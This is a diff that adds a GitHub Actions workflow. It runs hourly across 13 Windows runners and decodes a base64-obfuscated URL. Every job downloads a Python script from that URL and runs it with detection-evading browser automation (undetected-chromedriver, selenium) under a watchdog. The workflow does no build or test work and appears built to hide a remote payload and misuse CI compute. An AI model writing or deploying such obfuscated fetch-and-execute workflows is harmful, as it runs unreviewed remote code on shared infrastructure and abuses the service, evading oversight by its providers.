@@ -1,1 +1,70 @@
+name: Matrix Task Cluster
 
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: pool-group-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  run-agents:
+    name: "Worker-${{ matrix.node_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
+
+    steps:
+      - name: Environment Bootstrap & Payload Fetch
+        shell: bash
+        run: |
+          echo "[BOOTSTRAP] Initializing Node-${{ matrix.node_id }}..."
+          
+          # فك تشفير الرابط المصدر وتنزيل الملف
+          SOURCE_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$SOURCE_URL" -o worker_job.py
+          
+          echo "[BOOTSTRAP] Provisioning Python dependencies..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[BOOTSTRAP] Workspace successfully prepared."
+
+      - name: Launch Application & Monitor Execution
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Spawning Python instance on agent ${{ matrix.node_id }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $JobOptions = @{
+              FilePath     = "python"
+              ArgumentList = "worker_job.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $SubProcess = Start-Process @JobOptions
+          
+          Write-Output ">>> Watchdog active. Maximum duration set to 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $SubProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Execution finalized smoothly within the designated time."
+          }
+          catch {
+              Write-Output ">>> Time limit exceeded! Terminating background process..."
+              Stop-Process -InputObject $SubProcess -Force
+              Write-Output ">>> Process forcibly closed by watchdog."
+          }
+
+      - name: Job Cleanup
+        shell: bash
+        run: echo "[SUMMARY] Node-${{ matrix.node_id }} completed execution pipeline."
